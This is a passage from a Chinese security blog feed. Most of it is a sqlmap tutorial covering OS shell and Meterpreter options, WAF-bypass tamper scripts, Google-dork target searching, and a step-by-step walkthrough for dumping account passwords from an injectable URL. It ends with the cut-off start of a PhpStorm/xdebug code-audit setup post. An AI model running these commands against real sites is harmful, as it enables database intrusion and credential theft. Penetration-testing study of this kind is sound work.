</p><p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p><h2 id="十、用户自定义函数注入"><a href="#十、用户自定义函数注入" class="headerlink" title="十、用户自定义函数注入"></a>十、用户自定义函数注入</h2><p>用户自定义函数（UDF）    参数：–udf-inject,–shared-lib    你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中的共享库，DLL，或者Linux/Unix中共享对象，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p><h2 id="十一、系统文件操作"><a href="#十一、系统文件操作" class="headerlink" title="十一、系统文件操作"></a>十一、系统文件操作</h2><h5 id="1-从数据库服务器中读取文件"><a href="#1-从数据库服务器中读取文件" class="headerlink" title="1.从数据库服务器中读取文件"></a>1.从数据库服务器中读取文件</h5><p>参数：–file-read    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><h5 id="2-把文件上传到数据库服务器中"><a href="#2-把文件上传到数据库服务器中" class="headerlink" title="2.把文件上传到数据库服务器中"></a>2.把文件上传到数据库服务器中</h5><p>参数：–file-write,–file-dest    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。 </p><h2 id="十二、操作系统"><a href="#十二、操作系统" class="headerlink" title="十二、操作系统"></a>十二、操作系统</h2><h5 id="1-运行任意操作系统命令"><a href="#1-运行任意操作系统命令" class="headerlink" title="1.运行任意操作系统命令"></a>1.运行任意操作系统命令</h5><p>参数：–os-cmd,–os-shell<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</p><p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()，那么他创建的这两个函数可以执行系统命令。</p><p>在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。</p><p>用–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。</p><p>  当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p><p>1、ASP</p><p>2、ASP.NET</p><p>3、JSP</p><p>4、PHP</p><h5 id="2-Meterpreter配合使用"><a href="#2-Meterpreter配合使用" class="headerlink" title="2.Meterpreter配合使用"></a>2.Meterpreter配合使用</h5><p>参数：–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：</p><p>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。</p><p>2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：–os-pwn。</p><p>3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。</p><p>4、通过溢出Microsoft SQL Server2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof </p><h2 id="十三、对windows注册表操作"><a href="#十三、对windows注册表操作" class="headerlink" title="十三、对windows注册表操作"></a>十三、对windows注册表操作</h2><p>满足以下条件就可以对Windows注册表进行操作：</p><p>目标数据库管理系统是运行在Windows上的</p><p>目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server</p><p>支持堆查询</p><p>目标数据库管理系统当前用户有足够的权限</p><h5 id="1-读Windows注册表键值"><a href="#1-读Windows注册表键值" class="headerlink" title="1.读Windows注册表键值"></a>1.读Windows注册表键值</h5><p>  参数：–reg-read</p><h5 id="2-写Windows注册表键值"><a href="#2-写Windows注册表键值" class="headerlink" title="2.写Windows注册表键值"></a>2.写Windows注册表键值</h5><p>   参数：–reg-add</p><h5 id="3-删除Windows注册表键值"><a href="#3-删除Windows注册表键值" class="headerlink" title="3.删除Windows注册表键值"></a>3.删除Windows注册表键值</h5><p>   参数：–reg-del </p><p>4.注册表辅助选项</p><p>  参数：–reg-key、–reg-value、–reg-data和–reg-type</p><p>  适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以交互方式提供数据。</p><p>–reg-key：指定Windows注册表键值的路径</p><p>–reg-value：指定Windows注册表键值的键</p><p>–reg-data：指定Windows注册表键值的值</p><p>–reg-type：指定Windows注册表键值的值的数据类型</p><h2 id="十四、其他"><a href="#十四、其他" class="headerlink" title="十四、其他"></a>十四、其他</h2><h5 id="1-使用简写"><a href="#1-使用简写" class="headerlink" title="1.使用简写"></a>1.使用简写</h5><p>  参数：-z</p><p>  有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy –technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。</p><p>  利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：<br>   python sqlmap.py -z “bat,randoma,ign,tec=BEU” -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">www.target.com/vuln.php?id=1&quot;</a></p><h5 id="2-在成功检测到注入点时报警"><a href="#2-在成功检测到注入点时报警" class="headerlink" title="2.在成功检测到注入点时报警"></a>2.在成功检测到注入点时报警</h5><p>  参数：–alert</p><p>  该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：</p><p>   python sqlmap.py -r data.txt –alert “notify-send ‘找到漏洞了’“</p><p>  上例中用于发出警报的命令是Ubuntu中的notify-send命令</p><h5 id="3-设置问题的回答"><a href="#3-设置问题的回答" class="headerlink" title="3.设置问题的回答"></a>3.设置问题的回答</h5><p>  参数：–answers</p><p>  使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如：</p><p>  python sqlmap.py -u “<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E" target="_blank" rel="noopener">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E</a> –answers=”extending=N” –batch</p><h5 id="4-在成功检测到注入点时发出“嘟”声"><a href="#4-在成功检测到注入点时发出“嘟”声" class="headerlink" title="4.在成功检测到注入点时发出“嘟”声"></a>4.在成功检测到注入点时发出“嘟”声</h5><p>  参数：–beep</p><p>  使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用</p><h5 id="5-清除sqlmap创建的临时表和自定义函数"><a href="#5-清除sqlmap创建的临时表和自定义函数" class="headerlink" title="5.清除sqlmap创建的临时表和自定义函数"></a>5.清除sqlmap创建的临时表和自定义函数</h5><p>  参数：–cleanup</p><p>  强烈推荐在测试结束后使用此参数清除sqlmap创建的临时表和自定义函数，sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。</p><h5 id="6-检查依赖"><a href="#6-检查依赖" class="headerlink" title="6.检查依赖"></a>6.检查依赖</h5><p>  参数：–dependencies</p><p>  sqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：</p><p>  python sqlmap.py –dependencies</p><h5 id="7-关闭彩色输出"><a href="#7-关闭彩色输出" class="headerlink" title="7.关闭彩色输出"></a>7.关闭彩色输出</h5><p>参数：–disable-coloring</p><h5 id="8-指定使用Google-dork结果的某页"><a href="#8-指定使用Google-dork结果的某页" class="headerlink" title="8.指定使用Google dork结果的某页"></a>8.指定使用Google dork结果的某页</h5><p>  参数：–gpage</p><p>  使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。</p><h5 id="9-使用HTTP参数污染"><a href="#9-使用HTTP参数污染" class="headerlink" title="9.使用HTTP参数污染"></a>9.使用HTTP参数污染</h5><p>  参数：–hpp</p><p>  HTTP参数污染是绕过WAF/IPS/IDS的一种技术，这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。</p><h5 id="10-彻底检测WAF-IPS-IDS"><a href="#10-彻底检测WAF-IPS-IDS" class="headerlink" title="10.彻底检测WAF/IPS/IDS"></a>10.彻底检测WAF/IPS/IDS</h5><p>  参数：–identify-waf</p><p>  sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。</p><p>  python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –identify-waf -v 3</p><p>参数：–skip-waf</p><p>  默认地sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。</p><h5 id="11-模仿智能手机"><a href="#11-模仿智能手机" class="headerlink" title="11.模仿智能手机"></a>11.模仿智能手机</h5><p>  参数：–mobile</p><p>  有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种</p><h5 id="12-离线模式（仅仅使用会话数据）"><a href="#12-离线模式（仅仅使用会话数据）" class="headerlink" title="12.离线模式（仅仅使用会话数据）"></a>12.离线模式（仅仅使用会话数据）</h5><p>  参数：–offline</p><p>  添加此参数，sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。</p><h5 id="13-在Google-dork中展示页面权重"><a href="#13-在Google-dork中展示页面权重" class="headerlink" title="13.在Google dork中展示页面权重"></a>13.在Google dork中展示页面权重</h5><p>  参数：–page-rank</p><p>  与参数“-g”一起使用，这会使sqlmap向Google发起更多的请求并展示页面权重</p><h5 id="14-从输出目录中安全移除所有内容"><a href="#14-从输出目录中安全移除所有内容" class="headerlink" title="14.从输出目录中安全移除所有内容"></a>14.从输出目录中安全移除所有内容</h5><p>  参数：–purge-output</p><p>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：</p><p> python sqlmap.py –purge-output -v 3</p><h5 id="15-快速扫描"><a href="#15-快速扫描" class="headerlink" title="15.快速扫描"></a>15.快速扫描</h5><p>  参数：–smart</p><p>  当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。</p><h5 id="16-通过关键词使用或跳过payload"><a href="#16-通过关键词使用或跳过payload" class="headerlink" title="16.通过关键词使用或跳过payload"></a>16.通过关键词使用或跳过payload</h5><p>  参数：–test-filter</p><p>  若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子：</p><p>  python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –batch –test-filter=ROW</p><p>  参数：–test-skip</p><p>  若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。</p><h5 id="17-交互式sqlmap-Shell"><a href="#17-交互式sqlmap-Shell" class="headerlink" title="17.交互式sqlmap Shell"></a>17.交互式sqlmap Shell</h5><p>  参数：–sqlmap-shell</p><p>  使用此参数可以打开一个交互式的sqlmap Shell，支持历史记录。</p><h5 id="18-为初学者准备的简单向导"><a href="#18-为初学者准备的简单向导" class="headerlink" title="18.为初学者准备的简单向导"></a>18.为初学者准备的简单向导</h5><p>  参数：–wizard</p><p>  sqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。</p><h2 id="一把梭之脚本"><a href="#一把梭之脚本" class="headerlink" title="一把梭之脚本"></a>一把梭之脚本</h2><h4 id="穿WAF脚本"><a href="#穿WAF脚本" class="headerlink" title="穿WAF脚本"></a>穿WAF脚本</h4><p>   脚本穿waf(space2hash.py，base64encode.py, charencode.py不同的的脚本针对不同的数据库或者开发环境)： </p><p>  -u xxx -v 3 –dbs –batch –tamper”space2morehash.py”</p><h2 id="一把梭之Post注入"><a href="#一把梭之Post注入" class="headerlink" title="一把梭之Post注入"></a>一把梭之Post注入</h2><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h5><p>sqlmap.py -r test.txt -p “抓包到的post数据里面的其中一个post参数” –dbs</p><p>  解释意思：sqlamp进行post注入并且假如存在注入就返回数据库的信息，test.txt文档就是对网页抓到的包全选数据包内容然后保存为test.txt文件，直接-r test.txt是把文档放在与sqlmap同一目录下的才行。-p是指定参数注入，更精准</p><p>  假如不是放在与sqlmap同一目录下的话，那么就是sqlmap.py -r D:\test.txt -p “抓包到的post数据里面的其中一个post参数” –dbs</p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h5><p>sqlmap.py -u “存在注入的url,一般多用于后台” –data=”抓到的post包的最后一行的内容” -p “指定post包里面的某一个参数”</p><h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三:"></a>方法三:</h5><p>假设有个网站，url地址为</p><p><a href="http://www.127.0.0.1/base64?id=10" target="_blank" rel="noopener">http://www.127.0.0.1/base64?id=10</a></p><p>假如想测试这个页面是否有post注入用这个方式:</p><p>sqlmap.py -u “<a href="http://www.127.0.0.1/base64”" target="_blank" rel="noopener">http://www.127.0.0.1/base64”</a> –data=”id=10” -f –banner –dbs</p><h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四:"></a>方法四:</h5><p>自动注入方法</p><p>sqlmap.py -u “<a href="http://xxxxxx.com(cn/net/org)/login.asp(php,aspx,jsp等程序格式)”" target="_blank" rel="noopener">http://xxxxxx.com(cn/net/org)/login.asp(php,aspx,jsp等程序格式)”</a> –forms      </p><p>一般用于后台注入。</p><h2 id="一把梭之cookie注入"><a href="#一把梭之cookie注入" class="headerlink" title="一把梭之cookie注入"></a>一把梭之cookie注入</h2><h5 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一:"></a>方法一:</h5><p>假设有个网站，url地址为<a href="http://www.127.0.0.1/base32?id=45" target="_blank" rel="noopener">http://www.127.0.0.1/base32?id=45</a></p><p>假如想测试这个页面是否有cookie注入</p><p>采用的注入方式如下:sqlmap.py -u “<a href="http://www.127.0.0.1/base32”" target="_blank" rel="noopener">http://www.127.0.0.1/base32”</a> –data=”id=10” –dbs –level 2</p><p>解释：level 2是探测等级的意思，这里采用注入选择探测等级为2，当探测等级为2或2以上sqlmap是会尝试注入cookie参数的</p><h5 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二:"></a>方法二:</h5><p>sqlmap.py -u “存在注入url” –cookie=”抓包抓到的cookie”</p><p>或者是这样使用:sqlmap.py -u “存在注入url” –cookir=”抓包抓到的cookie” –level 2    //前面讲过了探测等级为2就注入cookie参数的</p><h2 id="一次sqlmap注入某注入点并且dump出账号密码全程"><a href="#一次sqlmap注入某注入点并且dump出账号密码全程" class="headerlink" title="一次sqlmap注入某注入点并且dump出账号密码全程"></a>一次sqlmap注入某注入点并且dump出账号密码全程</h2><p>判断注入点:sqlmap.py -u “存在注入url”</p><p>爆出所有数据库名字:sqlmap.py -u “存在注入url” –dbs</p><p>查看当前使用账号:sqlmap.py -u “存在注入url” –current-user</p><p>//打**的是关键看我下面的四步走</p><p>1、**查看当前数据库:sqlmap.py -u “存在注入url” –current-db</p><p>2、**列出数据库中所有表:sqlmap.py -u “存在注入url” –tables，除了这样也可以这样整，如下所示:sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说明：-D是指定数据库名称。</p><p>3、**-T是指定列要出字段的表，就是数据库中的表名。</p><p>列出数据库中的表中的字段:sqlmap.py -u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” –columns。</p><p>4、**跑出来表中的字段然后暴力拆解账号和密码,一般字段账号密码都是user/pass/password/username/keyword这些等等，自己找敏感的字段然后进行拆解。</p><p>-C指定要暴力拆解的字段</p><p>暴力拆解账号密码:sqlmap.py -u “存在注入url ” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “username,password,email(columns(字段)中疑似网站账号密码邮箱等敏感字段，举例子说明)” –dump</p><p> –dump将结果导出。</p><p>四步走有异曲同工之处，不管是什么方式的注入他们的方法都不会变。</p><h1 id="SQLMAP-–tamper-绕过WAF脚本"><a href="#SQLMAP-–tamper-绕过WAF脚本" class="headerlink" title="SQLMAP –tamper 绕过WAF脚本"></a>SQLMAP –tamper 绕过WAF脚本</h1><table><thead><tr><th>支持的数据库</th><th>编号</th><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>all</td><td>1</td><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td></td><td>2</td><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td></td><td>3</td><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td></td><td>4</td><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td></td><td>5</td><td>nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如  .replace（“SELECT”、””)） filters</td></tr><tr><td></td><td>6</td><td>space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td></tr><tr><td></td><td>7</td><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td></td><td>8</td><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>mssql</td><td>9</td><td>space2hash.py</td><td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td></tr><tr><td></td><td>10</td><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td></td><td>11</td><td>space2mssqlblank.py(mssql)</td><td>空格替换为其它空符号</td></tr><tr><td></td><td>12</td><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td></td><td>13</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>14</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>15</td><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td></td><td>16</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>17</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>18</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>19</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>mysql &gt;= 5.1.13</td><td>20</td><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td></td><td>21</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>22</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>23</td><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td></td><td>24</td><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td></td><td>25</td><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td></td><td>26</td><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td></td><td>27</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>28</td><td>modsecurityzeroversioned.py</td><td>包含了完整的查询与零版本注释</td></tr><tr><td></td><td>29</td><td>space2mysqldash.py</td><td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td></tr><tr><td></td><td>30</td><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like</td></tr><tr><td></td><td>31</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>32</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>33</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>34</td><td>versionedkeywords.py</td><td>Encloses each non-function keyword with versioned MySQL comment</td></tr><tr><td></td><td>35</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td></td><td>36</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>37</td><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>MySQL &lt; 5.1</td><td>38</td><td>halfversionedmorekeywords.py</td><td>关键字前加注释</td></tr><tr><td></td><td>39</td><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>MySQL &gt;= 5.1.13</td><td>40</td><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>Oracle</td><td>41</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>42</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>43</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>44</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>45</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>46</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>47</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>PostgreSQL</td><td>48</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>49</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>50</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>51</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>52</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>53</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>54</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>55</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>Access</td><td>56</td><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>其他</td><td>57</td><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td></td><td>58</td><td>unmagicquotes.py</td><td>宽字符绕过 GPC  addslashes</td></tr><tr><td></td><td>59</td><td>randomcomments.py</td><td>用/**/分割sql关键字</td></tr></tbody></table><p><strong>SQLMAP实战操作：</strong></p><p><strong>1.ACCESS数据库：</strong></p><p><code>sqlmap.py -u “url” /*-u为常规扫描参数*/</code></p><p><code>sqlmap.py -u “url” –tables /*–tables拆数据库表*/</code></p><p><code>sqlmap.py -u “url” –columns -T “要拆的表名”/*列出指定表名*/</code></p><p><code>sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” /*–dump为拆解字段名会保存在sqlmap/output目录下*/</code></p><p><strong>2.MYSQL数据库：</strong></p><p><code>sqlmap.py -u “url” /*扫描注入点*/</code></p><p><code>sqlmap.py -u “url” –dbs /*列出所有数据库*/</code></p><p><code>sqlmap.py -u “url” –current-db /*列出当前数据库*/</code></p><p><code>sqlmap.py -u “url” –current-user /*列出当前用户*/</code></p><p><code>sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</code></p><p><code>sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</code></p><p><code>sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</code></p><p><strong>3.SQLSERVER数据库：</strong></p><p><code>&lt;!--sqlmap.py -u “url” /*扫描注入点*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –dbs /*列出所有数据库*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –current-db /*列出当前数据库*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –current-user /*列出当前用户*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/--&gt;</code></p><p><code>&lt;!--sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”--&gt;</code></p><p><code>&lt;!--SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！--&gt;</code></p><p><strong>4.COOKIE注入：</strong></p><p><code>sqlmap.py -u “[www.xxx.com/asp](http://www.xxx.com/asp)或者[www.xxx.com/php](http://www.xxx.com/php)” –cookie</code> “参数名如id=1” –level 2/<em>level为提升权限</em>/</p><p>什么数据库就按照上面的数据库加上cookie语句拆解就行了</p><p><strong>5.POST注入：</strong></p><p>抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /*xxx.txt为保存包文件的文件名”</p><p><code>sqlmap.py -u “url” –data “POST参数”</code></p><p><strong>6.执行shell命令：</strong></p><p><code>sqlmap.py -u “url” –os-cmd=”net user” /*执行net user命令*/</code></p><p><code>sqlmap.py -u “url” –os-shell /*系统交互的shell*/</code></p><p><strong>7.注入HTTP请求 :</strong></p><p><code>sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/</code></p><p><strong>8.绕过WAF的tamper插件使用：</strong></p><p><code>sqlmap.py -u “url” –tamper “xxx.py”</code></p><p><code>sqlmap.py -u “url” –tamper=”xxx.py”</code></p><p><strong>9.将注入语句插入到指定位置：</strong></p><p><code>sqlmap.py -u “url([www.xxx.com/id/1](http://www.xxx.com/id/1)*.html)” –dbs</code></p><p>有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了”*”参数将SQL语句插入指定位置，一般用于伪静态注入。</p><p>在使用HTTP注入时使用-r参数也可以直接在文本中添加*号</p><p><strong>10.延时注入：</strong></p><p><code>sqlmap –dbs -u “url” –delay 0.5 /*延时0.5秒*/</code></p><p><code>sqlmap –dbs -u “url” –safe-freq /*请求2次*/</code></p><p><strong>11.使用谷歌语法搜索注入(Google hack)：</strong></p><p><code>sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype</code></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Phpstorm+phpstudy+xdebug代码审计平台</title>
    <link href="http://yoursite.com/2018/08/09/Phpstorm-phpstudy-xdebug%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B9%B3%E5%8F%B0/"/>
    <id>http://yoursite.com/2018/08/09/Phpstorm-phpstudy-xdebug代码审计平台/</id>
    <published>2018-08-09T13:20:01.000Z</published>
    <updated>2018-08-13T15:07:38.714Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP  集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。</p></blockquote><h3 id="【准备】"><a href="#【准备】" class="headerlink" title="【准备】"></a>【准备】</h3><p><strong>先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考<a href="https://blog.csdn.net/finish_dream/article/details/80045514" target="_blank" rel="noopener">https://blog.csdn.net/finish_dream/article/details/80045514</a> 亲测有效。</strong></p><h3 id="【配置步骤】"><a href="#【配置步骤】" class="headerlink" title="【配置步骤】"></a>【配置步骤】</h3><p><strong>进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。</strong></p><p><strong>1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。</strong></p><p><img src="\images\pasted-19.png" alt="upload successful"></p><p><strong>2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 